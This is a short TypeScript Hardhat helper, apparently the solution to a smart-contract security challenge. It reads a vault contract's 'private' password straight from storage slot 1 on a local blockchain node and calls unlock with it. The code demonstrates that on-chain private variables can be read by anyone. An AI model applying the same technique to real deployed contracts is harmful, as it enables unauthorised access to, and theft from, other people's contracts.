import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  // connect provider to local instance of blockchain
  const provider: any = await ethers.getDefaultProvider(
    "http://localhost:8545"
  );

  // grab password from storage slot 1 at the victim address
  const password: any = await provider.getStorageAt(victim.address, 1);

  // unlock vault & profit
  await victim.unlock(password);
};

export default helper;
